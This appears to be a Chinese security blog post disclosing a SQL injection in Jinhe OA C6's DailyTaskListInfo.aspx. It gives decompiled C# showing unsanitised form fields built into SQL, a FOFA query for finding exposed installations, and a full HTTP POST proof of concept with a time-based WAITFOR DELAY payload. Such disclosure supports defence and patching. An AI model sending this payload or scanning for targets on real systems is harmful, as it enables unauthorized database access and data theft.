---
title: "金和OA DailyTaskListInfo.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-DailyTaskListInfo-sqli.html
asset_dir: assets/金和oa-dailytasklistinfo.aspx-sql注入漏洞
---

# 金和OA DailyTaskListInfo.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/24 08:30
- 1044浏览
- [0评论](#comment)
- 44分钟阅读

深入探索

授权

安全研究报告

Windows安全工具

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `DailyTaskListInfo.aspx` 接口处存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

先看下

深入探索

漏洞预警服务

文本剥离工具

漏洞扫描服务

```
<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="DailyTaskListInfo.aspx.cs" Inherits="JHSoft.Web.DailyTaskManage.DailyTaskListInfo" %>
```

在 `bin` 目录下查找 `JHSoft.Web.DailyTaskManage.dll` 将其进行反编译后找到 `DailyTaskListInfo` 的处理逻辑

代码安全审计

[![金和OA DailyTaskListInfo.aspx SQL注入漏洞](images/img-001-093ae0c5ad79.webp)](https://image.mrxn.net/cc93d803844b4f13a71dd9f4e7b13d31.webp)

跟进 `GetWhere` 方法

深入探索

网络安全培训

技术文章订阅

恶意软件分析工具

```
private string GetWhere()
{
  StringBuilder stringBuilder = new StringBuilder();
  if (string.op_Inequality(((HtmlInputControl) this.txttaskname).Value.Trim(), ""))
    stringBuilder.Append($"TaskName like '%{((HtmlInputControl) this.txttaskname).Value.Trim()}%'");
  if (string.op_Inequality(((HtmlInputControl) this.hidTaskdept).Value.Trim(), "") && string.op_Inequality(((HtmlInputControl) this.hidTaskdept).Value.Trim(), this.InfoDept))
  {
    if (string.op_Inequality(stringBuilder.ToString(), ""))
      stringBuilder.Append(" and ");
    if (string.op_Equality(this.TaskSort, "execute"))
      stringBuilder.Append($" ',' + dbo.Fn_GetUserDeptIDs(t.TaskSendPersonID) + ',' like '%,{((HtmlInputControl) this.hidTaskdept).Value},%' ");
    else
      stringBuilder.Append($" (',' + dbo.Fn_GetUserDeptIDs(t.taskexecutorid) + ',' like '%,{((HtmlInputControl) this.hidTaskdept).Value.Trim().Replace(",", "','").ToString()},%' or ',' + dbo.Fn_GetUserDeptIDs(t.taskothersID) + ',' like '%,{((HtmlInputControl) this.hidTaskdept).Value.Trim().Replace(",", "','").ToString()},%')");
  }
  if (string.op_Inequality(((HtmlInputControl) this.Txttaskexecutor).Value.Trim(), ""))
  {
    if (string.op_Inequality(stringBuilder.ToString(), ""))
      stringBuilder.Append(" and ");
    if (string.op_Equality(this.TaskSort, "execute"))
      stringBuilder.Append($" u1.UserName like '%{((HtmlInputControl) this.Txttaskexecutor).Value.Trim()}%'");
    else
      stringBuilder.Append($" (dbo.Fn_GetUserName(t.TaskExecutorID) like '%{((HtmlInputControl) this.Txttaskexecutor).Value.Trim()}%' or dbo.Fn_GetUserName(t.TaskOthersID) like '%{((HtmlInputControl) this.Txttaskexecutor).Value}%') ");
  }
  if (string.op_Inequality(((ListControl) this.DrptaskState).SelectedValue, ""))
  {
    if (string.op_Inequality(stringBuilder.ToString(), ""))
      stringBuilder.Append(" and ");
    stringBuilder.Append($"TaskFinishFlag = '{((ListControl) this.DrptaskState).SelectedValue}'");
  }
  if (string.op_Inequality(this.txtBeginTime.Text.Trim(), ""))
  {
    if (string.op_Inequality(stringBuilder.ToString(), ""))
      stringBuilder.Append(" and ");
    stringBuilder.Append($"TaskEndTime>= '{this.txtBeginTime.Text.Trim()}'");
  }
  if (string.op_Inequality(this.txtEndTime.Text.Trim(), ""))
  {
    if (string.op_Inequality(stringBuilder.ToString(), ""))
      stringBuilder.Append(" and ");
    stringBuilder.Append($"TaskStartTime<= '{this.txtEndTime.Text.Trim()} 23:59:59'");
  }
  if (string.op_Inequality(((HtmlInputControl) this.Txttaskconnect).Value.Trim(), ""))
  {
    if (string.op_Inequality(stringBuilder.ToString(), ""))
      stringBuilder.Append(" and ");
    stringBuilder.Append($"TaskContent like '%{((HtmlInputControl) this.Txttaskconnect).Value.Trim()}%'");
  }
  if (!this.seltktype.Value.Equals("请选择"))
  {
    if (string.op_Inequality(stringBuilder.ToString(), ""))
      stringBuilder.Append(" and ");
    stringBuilder.AppendFormat("Tasktype='{0}'", (object) this.seltktype.Value);
  }
  return stringBuilder.ToString();
}
```

多个参数如 **txttaskname、hidTaskdept 等**被直接拼接进SQL语句中后执行，无任何过滤或校验，导致[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)复现需要访问 DailyTaskListInfo.aspx 页面获取需要的其他参数及其值

漏洞修复方案

[![金和OA DailyTaskListInfo.aspx SQL注入漏洞](images/img-002-3cde1e56c9d7.webp)](https://image.mrxn.net/a1cff4bbeb854e2496b1bf1030f4814f.webp)

```
POST /c6/Jhsoft.Web.dailytaskmanage/DailyTaskListInfo.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&_ListPage1LockNumber=1&_ListPage1RecordCount=0&__VIEWSTATE=xxxx&txtSelectTaskIDList=&DrpTaskType=all&DrptaskState=0&txttaskname='WAitfor+DelaY'0:0:5'--&Txttaskconnect=&txtBeginTime=&txtEndTime=&Txttaskdept=%B5%A5%BB%F7%D1%A1%D4%F1%B2%BF%C3%C5&hidTaskdept=&Txttaskexecutor=&seltktype=%C7%EB%D1%A1%D4%F1&btnSearch=%B2%E9%D1%AF&Txttaskdeptid=&hidFlag=0&__VIEWSTATEGENERATOR=xxxx
```

[![金和OA DailyTaskListInfo.aspx SQL注入漏洞](images/img-003-0783f32a6f41.webp)](https://image.mrxn.net/5a70d8b9af3948e796ae74c5ce76e274.webp)

延时 10 秒（执行两次）

编程

[![金和OA DailyTaskListInfo.aspx SQL注入漏洞](images/img-004-f0f28783d18a.webp)](https://image.mrxn.net/c0cc1adf10d44716b77d38adaebfa0fb.webp)

以及延时 4 秒（执行两次）

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
